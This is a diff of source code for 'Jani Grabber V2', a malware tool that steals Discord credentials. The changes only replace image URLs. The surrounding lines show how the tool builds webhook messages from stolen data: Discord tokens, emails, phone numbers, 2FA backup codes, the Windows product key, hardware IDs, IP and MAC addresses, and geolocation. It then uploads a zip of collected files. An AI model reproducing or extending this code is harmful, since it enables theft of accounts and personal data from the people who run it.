@@ -1160,13 +1160,13 @@ class JanigrabberV2(functions):
                             wfa = ("No discord backup codes found")
                         embed = {
                             "username": f"Dc Info | Jani Grabber V2",
-                            "avatar_url": "https://imgur.com/oKgog28",
+                            "avatar_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp",
                             "embeds": [
                                 {
                                     "author": {
                                         "name": "Jani op ",
                                         "url": "",
-                                        "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1210689655780151496/03b20c49d0c9b828770902528ae466c3.jpg?ex=65eb799b&is=65d9049b&hm=3fb801c507e6e66c0c30e6ba91c358778ac0c59db3910ad4fe6ca4f90b943a5b&format=webp&"
+                                        "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp"
                                     },
                                     "description": f"""**__Tokens__**```{token}\n\n{tokens}```__**Discord Info**__```Username: {user_name}\nUser ID: {user_id}\nToken: {token}\nNitro: {has_nitro}\nPhone Number: {phone_number}\nEmail: {email}\n2FA/MFA Enabled: {mfa_enabled}\n{wfa}```""",
                                     "color": 0x000000,
@@ -1176,7 +1176,7 @@ class JanigrabberV2(functions):
                                     },
                                     "footer": {
                                         "text": "Jani grabber V2",
-                                        "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1210689655780151496/03b20c49d0c9b828770902528ae466c3.jpg?ex=65eb799b&is=65d9049b&hm=3fb801c507e6e66c0c30e6ba91c358778ac0c59db3910ad4fe6ca4f90b943a5b&format=webp&"
+                                        "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp"
                                     },
                                 }
                             ]
@@ -1317,21 +1317,21 @@ class JanigrabberV2(functions):
             self.exceptions.append(traceback.format_exc())
         embed = {
             "username": f"System Info | Jani Grabber V2",
-            "avatar_url": "https://imgur.com/oKgog28",
+            "avatar_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp",
             "title": "__Jani Grabber V2 System Info__",
             "embeds": [
                      {
                          "author": {
                              "name": "life 😎",
                              "url": "",
-                             "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1210689655780151496/03b20c49d0c9b828770902528ae466c3.jpg?ex=65eb799b&is=65d9049b&hm=3fb801c507e6e66c0c30e6ba91c358778ac0c59db3910ad4fe6ca4f90b943a5b&format=webp&"
+                             "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp"
                          },
                          "description": f"""__**System Info**__```HWID: {hardwareid}\nRAM: {ram}GB\nArchitecture: {ee}bit\nUsername: {pc_username}\nDisk: {disk}\nPlatform: {platform}\nBattery: {battery}\nPC-Name: {name}\nWindows key: {windowskey}\nCPU: {cpu}\nGPU: {gpu}\nRefresh rate: {rr}\nModel name: {mn}\nBuild manufacturer: {bm}\nResolution: {size}\nPath: {path}```__**Ip Info**__\n```IP: {ip}\nCity: {city}\nCountry: {country}\nRegion: {region}\nMAC Address: {mac}\nVPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]}```[Google Maps Location]({googlemap})""",
                          "color": 0x000000,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "footer": {
                              "text": "Jani grabber V2",
-                             "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1210689655780151496/03b20c49d0c9b828770902528ae466c3.jpg?ex=65eb799b&is=65d9049b&hm=3fb801c507e6e66c0c30e6ba91c358778ac0c59db3910ad4fe6ca4f90b943a5b&format=webp&"
+                             "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp"
                          },
                      }
             ]
@@ -1361,28 +1361,28 @@ class JanigrabberV2(functions):
         embed = {
             "username": f"{name} | Jani Grabber V2",
             "content": content,
-            "avatar_url": "https://imgur.com/oKgog28",
+            "avatar_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp",
             "title": "__Jani Grabber V2__",
             "embeds": [
                      {
                          "author": {
                              "name": "Ban me",
                              "url": "",
-                             "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1210689655780151496/03b20c49d0c9b828770902528ae466c3.jpg?ex=65eb799b&is=65d9049b&hm=3fb801c507e6e66c0c30e6ba91c358778ac0c59db3910ad4fe6ca4f90b943a5b&format=webp&"
+                             "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp"
                          },
                          "description": description,
                          "color": 0x000000,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "footer": {
                              "text": "Jani grabber V2",
-                             "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1210689655780151496/03b20c49d0c9b828770902528ae466c3.jpg?ex=65eb799b&is=65d9049b&hm=3fb801c507e6e66c0c30e6ba91c358778ac0c59db3910ad4fe6ca4f90b943a5b&format=webp&"
+                             "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp"
                         }
                     }
             ]
         }
         file = {
             "username": f"{name} | Jani Grabber V2",
-            "avatar_url": "https://imgur.com/oKgog28"
+            "avatar_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp"
         }
         if int(len(description)) <= 4096:
             with open(_zipfile, 'rb') as f:
@@ -1407,7 +1407,7 @@ class JanigrabberV2(functions):
                                   'file': open(_zipfile, 'rb')}).json()["data"]["downloadPage"]
                 embed = {
                     "username": f"{name} | Jani Grabber V2",
-                    "avatar_url": "https://imgur.com/oKgog28",
+                    "avatar_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp",
                     "title": "__Jani Grabber V2__",
                     "content": content+f" {f}",
                 }
